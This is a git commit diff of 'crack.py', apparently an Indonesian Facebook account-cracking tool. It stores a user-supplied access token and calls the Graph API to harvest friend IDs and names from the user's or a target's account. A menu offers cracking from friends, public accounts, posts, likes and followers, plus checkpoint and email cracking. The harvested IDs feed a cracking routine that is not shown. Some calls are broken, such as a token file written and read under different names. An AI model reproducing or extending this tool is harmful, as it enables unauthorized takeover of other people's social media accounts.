27418a536d8e84f468517a062d44235a7d13965f
Rudal-XD <106883384+Rudal-XD@users.noreply.github.com>
2022-12-07 16:33:35 +0700

    Update crack.py

--- crack.py
+++ crack.py
@@ -133,33 +133,160 @@ def banner():
 
 balmond = O+"["+J+"•"+O+"]"
 
-class menu:
-		def login():
-			banner()
-			sky = '# MASUKAN TOKEN FACEBOOK'
-			sky2 = mark(sky, style='green')
-			sol().print(sky2, style='cyan')
-			panda = input(x+'['+p+'•'+x+'] Token Fb : ')
-			akun=open('.token.x','w').write(panda)
-			try:
-				tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
-				tes3 = json.loads(tes.text)['id']
-				sue = '# nice Login berhasil'
-				suu = mark(sue, style='green')
-				sol().print(suu, style='cyan')
-				time.sleep(2)
-				menu()
-			except KeyError:
-				sue = '# Login Gagal, Cek token'
-				suu = mark(sue, style='red')
-				sol().print(suu, style='cyan')
-				time.sleep(2)
-				login()
-			except requests.exception.ConnectionError:
-				li = '# KONEKSI INTERNET 									BERMASALAH, PERIKSA & COBA LAGI'
-				lo = mark(li, style='red')
-				sol().print(lo, style='cyan')
-				menu()
+
+def login():
+		banner()
+		sky = '# MASUKAN TOKEN FACEBOOK'
+		sky2 = mark(sky, style='green')
+		sol().print(sky2, style='cyan')
+		panda = input(x+'['+p+'•'+x+'] Token Fb : ')
+		akun=open('.token.x','w').write(panda)
+		try:
+			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
+			tes3 = json.loads(tes.text)['id']
+			sue = '# nice Login berhasil'
+			suu = mark(sue, style='green')
+			sol().print(suu, style='cyan')
+			time.sleep(2)
+			menu()
+		except KeyError:
+			sue = '# Login Gagal, Cek token'
+			suu = mark(sue, style='red')
+			sol().print(suu, style='cyan')
+			time.sleep(2)
+			login()
+		except requests.exception.ConnectionError:
+			li = '# KONEKSI INTERNET 									BERMASALAH, PERIKSA & COBA LAGI'
+			lo = mark(li, style='red')
+			sol().print(lo, style='cyan')
+			menu()
 		
+class menu:
+
+	def __init__(self): #line1
+		self.uid = []
+	def menu(self):
+		try:
+			toke = open('token.x','r').read()
+		except IOError:
+			print(' [%s+%s] Kamu belum login'%(M,N));login().__login__()
+		try:
+			r = requests.get('https://graph.facebook.com/me?access_token=%s'%(toke)).json()['name']
+		except KeyError:
+			print(' [%s!%s] Login gagal ...'%(M,N));os.system('rm -rf token.x');time.sleep(2);login().__login__()
+		except requests.exceptions.ConnectionError:
+			exit(' [%s!%s] cek koneksi'%(M,N))
+		try:
+			akss = open('token.x','r').read()
+		except IOError:
+			akss = '-'
+		banner()
+		IP = requests.get('https://api.ipify.org').text
+		jalan(' %s[ %sselamat Datang %s%s ]'%(N,H,r,N))
+		print(' %s[%s•%s] Alamat IP kamu saat ini : %s'%(H,O,H,IP))
+		print(' %s[%s•%s] Kamu masuk pada         : %s'%(N,O,N,waktu))
+		print(' %s'%(N))
+		print(' %s[%s0%s] crack dari daftar teman'%(N,O,N))
+		print(' %s[%s1%s] crack dari akun publik'%(N,O,N))
+		print(' %s[%s2%s] crack dari akun massal'%(N,O,N))
+		print(' %s[%s3%s] crack dari postingan'%(N,O,N))
+		print(' %s[%s4%s] crack dari likes post'%(N,O,N))
+		print(' %s[%s5%s] crack dari followers'%(N,O,N))
+		print(' %s[%s6%s] cek opsi akun chekpoint'%(N,O,N))
+		print(' %s[%s7%s] cek hasil crack ok,cp'%(N,O,N))
+		print(' %s[%s8%s] seting User-Agent'%(N,O,N))
+		print(' %s[%s9%s] crack email'%(N,O,N))
+		print(' %s[%sG%s] Get data² facebook'%(N,O,N))
+		print(' %s[%sK%s] Lapor bug script'%(N,O,N))
+		print(' %s[%sA%s] Keluar, hapus token'%(N,O,N))
+		self.pilih()
+	def pilih(self):
+
+		print(' %s'%(N))
+
+		usna = input(' %s[%s+%s] choose : '%(N,O,N))
+
+		if usna in ['']:
+
+			print(' %s'%(N))
+
+			print(' %s[%s!%s] Jangan kosong mas'%(N,M,N));time.sleep(2);menu().main()
+
+		elif usna in ['0','00']:
+
+			try:
+
+				token = open('token.x','r').read()
+
+			except IOError:
+
+				os.system('rm -rf token.x')
+
+				exit(' %s[%s!%s] Cek token kamu'%(N,M,N))
+
+			try:
+
+				lmt = input(' %s[%s+%s] Limit id : '%(N,O,N))
+
+				r = requests.get('https://graph.facebook.com/me?fields=friends.limit(%s)&access_token=%s'%(lmt,token))
+
+				z = json.loads(r.text)
+
+				id = []
+
+				for w in z['friends']['data']:
+
+					id.append(z['id'] + '<=>' + w['name'])
+
+			except KeyError:
+
+				print(' %s[%s!%s] Akun anda tidak publik...'%(N,M,N));time.sleep(2);menu().main()
+
+			else:
+
+				crack().fbeh(id)
+
+		elif usna in ['1','01']:
+
+			try:
+
+				token = open('token.x','r').read()
+
+			except IOError:
+
+				os.system('rm -rf token.x')
+
+				exit(' %s[%s!%s] Coba jalankan ulang !'%(N,M,N))
+
+			try:
+
+				print(' %s'%(N))
+
+				idt = input(' %s[%s•%s] Masukan id : '%(N,O,N))
+
+				r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s'%(idt,token))
+
+				e = json.loads(r.text)
+
+				id = []
+
+				for u in e['friends']['data']:
+
+					id.append(u['id'] + '<=>' + u['name'])
+
+			except KeyError:
+
+				print(' %s'%(N))
+
+				jalan(' %s[%s•%s] ID %s tidak di temukan!'%(N,M,N,idt));time.sleep(2);menu().main()
+
+			else:
+
+				crack().fbeh(id)
+
+		elif usna in ['2','02']:
+
+				exit()
+
 if __name__=='__main__':
 	menu()
